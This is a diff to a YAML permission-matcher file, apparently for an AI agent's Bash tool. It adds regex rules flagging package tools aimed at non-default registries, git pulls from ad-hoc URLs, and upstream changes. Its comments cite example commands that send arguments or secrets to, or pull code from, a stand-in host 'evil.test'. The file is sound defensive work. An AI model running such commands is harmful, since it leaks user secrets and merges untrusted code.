@@ -188,6 +188,14 @@ matchers:
     tool: Bash
     # the method arrives from a variable or a substitution: it cannot be shown to be a read, so it fails closed
     command: '^(gh|glab)\s+api\b(?=.*\s(-X|--method|--request)(\s+|=)?[$`])'
+  # AN EXPLICIT ENDPOINT POINTS THE TOOL SOMEWHERE ELSE. `npm view --registry https://evil.test <secret>`,
+  # `pip list --index-url https://evil.test/simple`, `helm template --repo https://evil.test` and `gh api
+  # --hostname evil.test <secret>` each send the rest of the command line — argument values included — to a host
+  # that is in no lockfile and no configuration. The DEFAULT endpoints are not this: a tool reaching its own
+  # official host is the ordinary case, and localhost is a local development server (exit review 9).
+  - capability: command.network-tool
+    tool: Bash
+    command: '^(npm|pnpm|yarn|bun|pip|pip3|uv|poetry|helm|gh|glab|cargo|gem|nuget|composer|go)\b[^|;&]*\s(--registry|--index-url|--extra-index-url|--repo|--hostname|--host|--index|--default-index|--source)(=|\s+)(?!(https?://)?(localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0|registry\.npmjs\.org|registry\.yarnpkg\.com|pypi\.org|files\.pythonhosted\.org|api\.github\.com|github\.com|gitlab\.com|crates\.io|rubygems\.org|proxy\.golang\.org|repo1\.maven\.org|charts\.helm\.sh)([:/\s]|$))\S'
   - capability: forge.repo.read
     tool: Bash
     command: '^(gh\s+(repo\s+view|api)|glab\s+(repo\s+view|api))\b'
@@ -480,6 +488,21 @@ matchers:
   - capability: git.local.reset
     tool: Bash
     command: '^git\s+(fetch|pull)\b[^|;&]*(\s\+\S+:\S|\s(-f|--force)\b[^|;&]*\s\S+:\S)'
+  # A URL ON THE COMMAND LINE IS A REMOTE NOBODY CONFIGURED. `git pull https://evil.test/x.git main` merges
+  # content from a host that appears in no remote, no config and no review, straight into the working tree —
+  # which is the same act as merging FETCH_HEAD and belongs to the same capability. Pulling from a CONFIGURED
+  # remote by name is ordinary work and stays ALLOW (exit review 9).
+  - capability: git.local.merge.network
+    tool: Bash
+    command: '^git\s+(pull|fetch)\b[^|;&]*\s([a-z][a-z0-9+.-]*://|git@|ssh://|[^\s/]+@[^\s:]+:)'
+  # `git branch -u` CHANGES WHERE A BRANCH PUSHES. It touches no file, so it was not matched at all — and it
+  # silently re-points every later `git push` at a different remote branch (exit review 9).
+  # `-m`/`--move` is NOT here: renaming a LOCAL branch is ordinary work, settled in round 15 and pinned by
+  # `bypass.test.ts`. Its forcing twin `-M` destroys a ref and is already matched, by the marker the evaluator
+  # emits case-sensitively — which is where that distinction has to be made, since matchers are compiled `i`.
+  - capability: git.remote.configure
+    tool: Bash
+    command: '^git\s+branch\b[^|;&]*\s(-u|--set-upstream-to|--unset-upstream)(=|\s|$)'
   - capability: git.local.branch.delete
     tool: Bash
     command: '^git\s+branch\b[^|;&]*\s(-[a-zA-Z]*[dD][a-zA-Z]*|--delete)(\s|$)'
